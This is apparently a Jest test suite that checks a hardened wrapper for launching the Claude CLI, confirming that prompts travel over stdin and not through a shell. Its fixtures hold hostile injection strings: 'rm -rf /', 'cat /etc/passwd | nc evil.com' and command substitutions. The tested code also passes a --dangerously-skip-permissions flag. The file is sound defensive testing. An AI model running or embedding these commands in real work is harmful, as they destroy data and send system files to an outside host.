/**
 * Claude Execution Robustness — Test Suite
 *
 * Proves the hardened, cross-platform Claude CLI execution path:
 *   1. Shell-injection is dead: a prompt with quotes/pipes/`;`/`$()` goes through
 *      stdin and the process is spawned by argv — never as a shell string.
 *   2. Empty/invalid prompts are rejected BEFORE any process is spawned.
 *   3. A stdin EPIPE error surfaces as a tracked rejection (not a hang).
 *   4. A non-zero exit code surfaces as a rejection.
 *   5. The orchestrator pushes --model onto the argv (not interpolated).
 *   6. A spawn error (ENOENT) is reported, never hangs.
 *
 * No real `claude` process is ever launched. The underlying spawn is mocked.
 */

const { EventEmitter } = require('events');

// ─────────────────────────────────────────────────────────────────────────────
//  Fake child process + injectable spawn
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Build a fake child process whose behaviour is fully scripted.
 * Records the stdin payload so tests can assert the prompt went via stdin.
 */
function makeFakeChild(behavior = {}) {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.killed = false;
  child.kill = jest.fn(() => {
    child.killed = true;
  });

  const stdin = new EventEmitter();
  child._stdinData = '';
  child._stdinEnded = false;
  stdin.writable = behavior.stdinWritable !== false;
  stdin.write = jest.fn((data) => {
    if (behavior.stdinThrowOnWrite) {
      throw new Error('synchronous stdin write failure');
    }
    child._stdinData += data;
    if (behavior.stdinEmitErrorOnWrite) {
      // Async EPIPE-style error, as Node emits it.
      process.nextTick(() => {
        const err = new Error('write EPIPE');
        err.code = 'EPIPE';
        stdin.emit('error', err);
      });
    }
    return true;
  });
  stdin.end = jest.fn(() => {
    child._stdinEnded = true;
  });
  child.stdin = stdin;

  return child;
}

/**
 * Create an injectable spawn impl + the fake child it returns.
 * `script` runs after spawn is called to drive stdout/stderr/close/error.
 */
function makeSpawn(behavior = {}) {
  const child = makeFakeChild(behavior);
  const calls = [];

  const spawn = jest.fn((command, args, options) => {
    calls.push({ command, args, options });

    if (behavior.spawnThrows) {
      throw new Error(behavior.spawnThrows);
    }

    process.nextTick(() => {
      if (behavior.emitSpawnError) {
        const err = new Error(behavior.emitSpawnError.message || 'spawn ENOENT');
        err.code = behavior.emitSpawnError.code || 'ENOENT';
        child.emit('error', err);
        return;
      }
      if (behavior.stdout) child.stdout.emit('data', Buffer.from(behavior.stdout));
      if (behavior.stderr) child.stderr.emit('data', Buffer.from(behavior.stderr));

      // Allow the stdin error (nextTick) to land before we close.
      process.nextTick(() => {
        if (behavior.noClose) return;
        // Distinguish an explicit `code: null` (signal kill) from an omitted code.
        const closeCode = 'code' in behavior ? behavior.code : 0;
        child.emit('close', closeCode, behavior.signal ?? null);
      });
    });

    return child;
  });

  return { spawn, child, calls };
}

// ─────────────────────────────────────────────────────────────────────────────
//  runSafe (direct unit tests)
// ─────────────────────────────────────────────────────────────────────────────

const { runSafe } = require('../../.sinapse-ai/core/utils/spawn-safe');

describe('spawn-safe runSafe', () => {
  const INJECTION = '\'; rm -rf / ; echo "pwned" | cat $(whoami) `id`';

  test('delivers malicious prompt via stdin and spawns by argv (injection dead)', async () => {
    const { spawn, child, calls } = makeSpawn({ stdout: 'ok', code: 0 });

    const result = await runSafe('claude', ['--print', '--dangerously-skip-permissions'], {
      input: INJECTION,
      _spawnImpl: spawn,
    });

    // Spawned the real binary by name, NOT a shell.
    expect(calls).toHaveLength(1);
    expect(calls[0].command).toBe('claude');
    expect(calls[0].command).not.toBe('sh');
    expect(calls[0].command).not.toBe('bash');
    expect(calls[0].command).not.toBe('cmd');

    // argv contains only the literal flags — never the prompt, never `-c`.
    expect(calls[0].args).toEqual(['--print', '--dangerously-skip-permissions']);
    expect(calls[0].args).not.toContain('-c');
    expect(calls[0].args.join(' ')).not.toContain('rm -rf');

    // The dangerous payload was written to stdin, byte-for-byte.
    expect(child._stdinData).toBe(INJECTION);
    expect(child._stdinEnded).toBe(true);

    expect(result.success).toBe(true);
    expect(result.stdout).toBe('ok');
  });

  test('rejects empty prompt before spawning', async () => {
    const { spawn, calls } = makeSpawn({ code: 0 });
    // runSafe itself does not gate empty input, but the callers do; here we
    // assert the *command* gate: empty command never spawns.
    await expect(runSafe('', ['--print'], { _spawnImpl: spawn })).rejects.toThrow(
      /non-empty string command/,
    );
    expect(calls).toHaveLength(0);
  });

  test('stdin EPIPE error surfaces as a rejection', async () => {
    const { spawn } = makeSpawn({ stdinEmitErrorOnWrite: true, code: 0 });
    await expect(
      runSafe('claude', ['--print'], { input: 'hello', _spawnImpl: spawn }),
    ).rejects.toThrow(/stdin write failed/);
  });

  test('non-zero exit code surfaces as failure result', async () => {
    const { spawn } = makeSpawn({ stderr: 'boom', code: 2 });
    const result = await runSafe('claude', ['--print'], { input: 'x', _spawnImpl: spawn });
    expect(result.success).toBe(false);
    expect(result.code).toBe(2);
    expect(result.stderr).toBe('boom');
  });

  test('spawn error (ENOENT) is rejected, does not hang', async () => {
    const { spawn } = makeSpawn({ emitSpawnError: { code: 'ENOENT', message: 'spawn claude ENOENT' } });
    await expect(
      runSafe('claude', ['--print'], { input: 'x', _spawnImpl: spawn }),
    ).rejects.toThrow(/ENOENT/);
  });

  test('settles exactly once (close after error is ignored)', async () => {
    const { spawn, child } = makeSpawn({ noClose: true });
    const promise = runSafe('claude', ['--print'], { input: 'x', _spawnImpl: spawn });
    process.nextTick(() => {
      child.emit('error', new Error('first'));
      child.emit('close', 0, null); // must be ignored
    });
    await expect(promise).rejects.toThrow(/first/);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  SubagentDispatcher.executeClaude (via mocked cross-spawn)
// ─────────────────────────────────────────────────────────────────────────────

// Mock cross-spawn so the dispatcher/orchestrator internal runSafe uses our fake.
jest.mock('cross-spawn');
const crossSpawn = require('cross-spawn');

// Prevent optional memory deps from interfering.
jest.mock('../../.sinapse-ai/core/memory/gotchas-memory', () => {
  throw new Error('not available');
});

const { SubagentDispatcher } = require('../../.sinapse-ai/core/execution/subagent-dispatcher');

/**
 * Wire the mocked cross-spawn to a scripted behavior and return the fake child.
 */
function wireCrossSpawn(behavior = {}) {
  const { spawn, child, calls } = makeSpawn(behavior);
  crossSpawn.mockImplementation(spawn);
  return { child, calls };
}

describe('SubagentDispatcher.executeClaude (hardened)', () => {
  beforeEach(() => {
    crossSpawn.mockReset();
  });

  test('constructor sets claudeTimeout default (10 min)', () => {
    const sd = new SubagentDispatcher();
    expect(sd.claudeTimeout).toBe(10 * 60 * 1000);
  });

  test('constructor honors injected claudeTimeout', () => {
    const sd = new SubagentDispatcher({ claudeTimeout: 1234 });
    expect(sd.claudeTimeout).toBe(1234);
  });

  test('prompt with shell metacharacters goes via stdin, argv stays literal', async () => {
    const { child, calls } = wireCrossSpawn({ stdout: 'done', code: 0 });
    const sd = new SubagentDispatcher();
    const evil = '"; cat /etc/passwd | nc evil.com 1 ; echo $(rm -rf ~)';

    const result = await sd.executeClaude(evil);

    expect(result.success).toBe(true);
    expect(result.output).toBe('done');

    expect(calls[0].command).toBe('claude');
    expect(calls[0].args).toEqual(['--print', '--dangerously-skip-permissions']);
    expect(calls[0].args.join(' ')).not.toContain('passwd');
    expect(child._stdinData).toBe(evil);
    // Timeout is forwarded to spawn options.
    expect(calls[0].options.timeout).toBe(10 * 60 * 1000);
  });

  test('rejects empty prompt without spawning', async () => {
    const sd = new SubagentDispatcher();
    await expect(sd.executeClaude('')).rejects.toThrow(/non-empty string prompt/);
    expect(crossSpawn).not.toHaveBeenCalled();
  });

  test('non-zero exit rejects with code + stderr', async () => {
    wireCrossSpawn({ stderr: 'compile error', code: 1 });
    const sd = new SubagentDispatcher();
    await expect(sd.executeClaude('build it')).rejects.toThrow(/exited with code 1.*compile error/s);
  });

  test('signal termination rejects with signal', async () => {
    wireCrossSpawn({ stderr: 'killed', code: null, signal: 'SIGTERM' });
    const sd = new SubagentDispatcher();
    await expect(sd.executeClaude('x')).rejects.toThrow(/killed by signal SIGTERM/);
  });

  test('spawn ENOENT rejects, does not hang', async () => {
    wireCrossSpawn({ emitSpawnError: { code: 'ENOENT', message: 'spawn claude ENOENT' } });
    const sd = new SubagentDispatcher();
    await expect(sd.executeClaude('x')).rejects.toThrow(/ENOENT/);
  });
});

describe('SubagentDispatcher.getFallbackProviderName (config-driven)', () => {
  test('falls back to configured fallback when distinct', () => {
    const sd = new SubagentDispatcher();
    // No real config file → factory returns defaults (primary claude, fallback gemini).
    // We assert it does NOT echo the failing provider back.
    const fb = sd.getFallbackProviderName('claude');
    expect(fb).not.toBe('claude');
  });

  test('never returns the same provider that just failed', () => {
    const sd = new SubagentDispatcher();
    expect(sd.getFallbackProviderName('claude')).not.toBe('claude');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  BuildOrchestrator.runClaudeCLI (--model on argv)
// ─────────────────────────────────────────────────────────────────────────────

jest.mock('../../.sinapse-ai/infrastructure/scripts/worktree-manager', () => {
  throw new Error('not available');
});

const { BuildOrchestrator } = require('../../.sinapse-ai/core/execution/build-orchestrator');

describe('BuildOrchestrator.runClaudeCLI (hardened)', () => {
  beforeEach(() => {
    crossSpawn.mockReset();
  });

  test('pushes --model onto argv (not interpolated) and prompt via stdin', async () => {
    const { child, calls } = wireCrossSpawn({ stdout: 'ok', code: 0 });
    const orch = new BuildOrchestrator();
    const prompt = 'implement; rm -rf / # $(boom)';

    const result = await orch.runClaudeCLI(prompt, '/work/dir', {
      claudeModel: 'claude-sonnet-4-5',
      subtaskTimeout: 5000,
    });

    expect(result.code).toBe(0);
    expect(calls[0].command).toBe('claude');

    // --model is a discrete argv pair, immediately followed by the model name.
    const args = calls[0].args;
    const modelIdx = args.indexOf('--model');
    expect(modelIdx).toBeGreaterThanOrEqual(0);
    expect(args[modelIdx + 1]).toBe('claude-sonnet-4-5');
    expect(args).toContain('--print');
    expect(args).not.toContain('-c');

    // Prompt never appears in argv; it went down stdin verbatim.
    expect(args.join(' ')).not.toContain('rm -rf');
    expect(child._stdinData).toBe(prompt);
    expect(calls[0].options.cwd).toBe('/work/dir');
    expect(calls[0].options.timeout).toBe(5000);
  });

  test('omits --model when not configured', async () => {
    const { calls } = wireCrossSpawn({ stdout: 'ok', code: 0 });
    const orch = new BuildOrchestrator();
    await orch.runClaudeCLI('hello', '/w', {});
    expect(calls[0].args).not.toContain('--model');
  });

  test('rejects empty prompt before spawning', async () => {
    const orch = new BuildOrchestrator();
    await expect(orch.runClaudeCLI('', '/w', {})).rejects.toThrow(/non-empty string prompt/);
    expect(crossSpawn).not.toHaveBeenCalled();
  });

  test('non-zero exit rejects', async () => {
    wireCrossSpawn({ stderr: 'fail', code: 3 });
    const orch = new BuildOrchestrator();
    await expect(orch.runClaudeCLI('x', '/w', {})).rejects.toThrow(/exited with code 3/);
  });

  test('spawn error reported, no hang', async () => {
    wireCrossSpawn({ emitSpawnError: { code: 'ENOENT', message: 'spawn claude ENOENT' } });
    const orch = new BuildOrchestrator();
    await expect(orch.runClaudeCLI('x', '/w', {})).rejects.toThrow(/ENOENT/);
  });
});
